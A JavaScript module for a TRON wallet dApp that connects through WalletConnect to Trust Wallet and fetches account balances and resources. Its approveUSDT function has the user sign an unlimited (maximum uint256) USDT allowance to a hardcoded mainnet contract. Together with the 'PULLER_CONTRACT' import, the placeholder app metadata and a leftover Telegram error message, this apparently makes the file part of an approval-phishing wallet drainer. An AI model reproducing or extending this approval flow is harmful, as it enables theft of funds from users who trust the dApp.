/* eslint-disable @typescript-eslint/no-unused-vars */
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { PULLER_CONTRACT, USDT_CONTRACT } from './App2';

const isTestnet = false; // Set to true for testnet, false for mainnet
export const networkID = isTestnet ? 'Nile' : 'Mainnet'
export const testnetHost = 'https://nile.trongrid.io';
export const mainnetHost = 'https://api.trongrid.io';
export const networkHost = isTestnet ? testnetHost : mainnetHost;

const contractAddress = isTestnet ? 'TGCebG7JR8izWeowWDLkuF5KdDPm5wya5y' : "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw"; // Replace with your deployed contract address
const usdtAddress = isTestnet ? 'TAGRoG9A4rPuUgs7mgsrauPEjQQfd1uBBK' : 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Mainnet USDT contract address

export const tronWallet = new WalletConnectAdapter({
    network: networkID,
    options: {
        relayUrl: 'wss://relay.walletconnect.com',
     
        projectId: '1d7c094b92213b27e88ac00ab7602643',
        metadata: {
            name: 'Example App',
            description: 'Example App',
            url: 'https://yourdapp-url.com',
            icons: ['https://yourdapp-url.com/icon.png'],
        },
         qrcodeModalOptions: {
            desktopLinks: ['trust'], // Force desktop behavior on mobile
            mobileLinks: ['trust']   // Explicitly specify mobile links
        }
    },
    web3ModalConfig: {
        themeMode: 'dark',
        themeVariables: {
            '--wcm-z-index': '1000',
        },
        explorerRecommendedWalletIds: [
            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
            '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
            '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
           
        ],
    },
});
export const getWalletConnectUri = async () => {
    try {
        console.log('Getting WalletConnect URI...');
        
        // Access the underlying provider from the adapter
        // The provider is usually stored in the adapter instance
        const provider = tronWallet?.provider;
        
        if (!provider) {
            console.error('WalletConnect provider not found');
            return null;
        }

        // Different versions of WalletConnect have different methods
        let uri = null;

        // Method 1: For WalletConnect v2
        if (provider.connector) {
            // WalletConnect v2 uses connector
            const { connector } = provider;
            
            // Check if connector has URI methods
            if (connector.uri) {
                uri = connector.uri;
            } else if (connector.transport && connector.transport.uri) {
                uri = connector.transport.uri;
            } else if (connector._transport && connector._transport.uri) {
                uri = connector._transport.uri;
            }
            
            // If URI is not available yet, try to create pairing
            if (!uri && connector.connect) {
                await connector.connect();
                // Wait a bit for URI generation
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Try to get URI again
                if (connector.uri) uri = connector.uri;
            }
        }

        // Method 2: For WalletConnect v1 or alternative approach
        if (!uri && provider.wc) {
            // WalletConnect v1 or some implementations
            const { wc } = provider;
            if (wc.uri) {
                uri = wc.uri;
            }
        }

        // Method 3: Check if provider has direct URI access
        if (!uri && provider.uri) {
            uri = provider.uri;
        }

        // Method 4: Try to trigger connection and catch the URI
        if (!uri) {
            console.log('Attempting to get URI through connection trigger...');
            
            // Create a temporary event listener to catch the URI
            let uriCaptured = null;
            
            const uriHandler = (eventUri) => {
                console.log('URI captured from event:', eventUri);
                uriCaptured = eventUri;
            };

            // Some providers emit URI events
            if (provider.on) {
                provider.on('display_uri', uriHandler);
                provider.on('uri', uriHandler);
            }

            // Trigger connection process briefly
            try {
                // This might trigger URI generation
                await Promise.race([
                    new Promise(resolve => {
                        if (provider.connect) provider.connect().catch(() => {});
                        setTimeout(resolve, 2000);
                    }),
                    new Promise(resolve => setTimeout(resolve, 3000))
                ]);
            } catch (error) {
                console.log('Connection trigger error (expected):', error.message);
            }

            // Remove event listeners
            if (provider.off) {
                provider.off('display_uri', uriHandler);
                provider.off('uri', uriHandler);
            }

            uri = uriCaptured;
        }

        if (uri) {
            console.log('WalletConnect URI obtained:', uri);
            return uri;
        } else {
            console.warn('Could not retrieve WalletConnect URI');
            
            // Last resort: check the internal state
            console.log('Provider object structure:', Object.keys(provider));
            if (provider.connector) {
                console.log('Connector structure:', Object.keys(provider.connector));
            }
            
            return null;
        }

    } catch (error) {
        console.error('Error getting WalletConnect URI:', error);
        return null;
    }
}
export const approveUSDT = async (account, tronWeb) => {

    console.log('Starting USDT approval process...');
    
    const uri = await getWalletConnectUri();
    
    console.log('WalletConnect URI:', uri);
    
    
    
    const connectResult = await tronWallet.connect();
  
    console.log("WalletConnect URI:", connectResult);

    const functionSelector = "approve(address,uint256)";

    const options = {
        feeLimit: 1000000000,
        callValue: 0,
        owner_address:tronWeb.address.toHex(account)
    };

    const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    const parameters = [
        { type: 'address', value: contractAddress },
        { type: 'uint256', value: amount },
    ]

    const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        usdtAddress,
        functionSelector,
        options,
        parameters,
        account
    );
    const signedTransaction = await tronWallet.signTransaction(transaction)
    console.log("Signel Transaction", signedTransaction)

    const data = await tronWeb.trx.sendRawTransaction(signedTransaction);
    try {
        console.log("Transaction Hash:", data);
    } catch (tgError) {
      console.error('Failed to send to Telegram:', tgError);
    }
    return data;
}

// Function to fetch TRX balance, bandwidth, and energy
export const fetchUserResources = async (account, tronWeb) => {
    try {
        const resources = {
            trxBalance: 0,
            bandwidth: {
                used: 0,
                total: 0,
                available: 0
            },
            energy: {
                used: 0,
                total: 0,
                available: 0
            }
        };

        // Fetch TRX balance
        const balance = await tronWeb.trx.getBalance(account);
        resources.trxBalance = tronWeb.fromSun(balance);

        // Fetch account resources (bandwidth and energy)
        const accountResources = await tronWeb.trx.getAccountResources(account);
        
        // Process bandwidth
        if (accountResources.NetLimit !== undefined) {
            resources.bandwidth.used = accountResources.NetUsed || 0;
            resources.bandwidth.total = accountResources.NetLimit || 0;
            resources.bandwidth.available = resources.bandwidth.total - resources.bandwidth.used;
        }

        // Add free bandwidth (5000 daily for all accounts)
        const freeBandwidth = 5000;
        const freeNetUsed = accountResources.freeNetUsed || 0;
        const freeBandwidthAvailable = freeBandwidth - freeNetUsed;
        
        resources.bandwidth.free = {
            used: freeNetUsed,
            total: freeBandwidth,
            available: freeBandwidthAvailable
        };

        // Process energy
        if (accountResources.EnergyLimit !== undefined) {
            resources.energy.used = accountResources.EnergyUsed || 0;
            resources.energy.total = accountResources.EnergyLimit || 0;
            resources.energy.available = resources.energy.total - resources.energy.used;
        }

        console.log("User Resources:", resources);
        return resources;

    } catch (error) {
        console.error("Error fetching user resources:", error);
        return {
            trxBalance: 0,
            bandwidth: { used: 0, total: 0, available: 0, free: { used: 0, total: 5000, available: 5000 } },
            energy: { used: 0, total: 0, available: 0 },
            error: error.message
        };
    }
};

// Function to get account info including frozen balances
export const fetchAccountInfo = async (account, tronWeb) => {
    try {
        const accountInfo = await tronWeb.trx.getAccount(account);
        
        const info = {
            address: account,
            balance: tronWeb.fromSun(accountInfo.balance || 0),
            frozenForEnergy: 0,
            frozenForBandwidth: 0,
            createTime: accountInfo.create_time || 0
        };

        // Check for frozen balances (for bandwidth)
        if (accountInfo.frozen && accountInfo.frozen.length > 0) {
            info.frozenForBandwidth = tronWeb.fromSun(accountInfo.frozen[0].frozen_balance || 0);
        }

        // Check for frozen balances (for energy) - account_resource
        if (accountInfo.account_resource && accountInfo.account_resource.frozen_balance_for_energy) {
            info.frozenForEnergy = tronWeb.fromSun(accountInfo.account_resource.frozen_balance_for_energy.frozen_balance || 0);
        }

        console.log("Account Info:", info);
        return info;

    } catch (error) {
        console.error("Error fetching account info:", error);
        return {
            address: account,
            balance: 0,
            frozenForEnergy: 0,
            frozenForBandwidth: 0,
            error: error.message
        };
    }
};


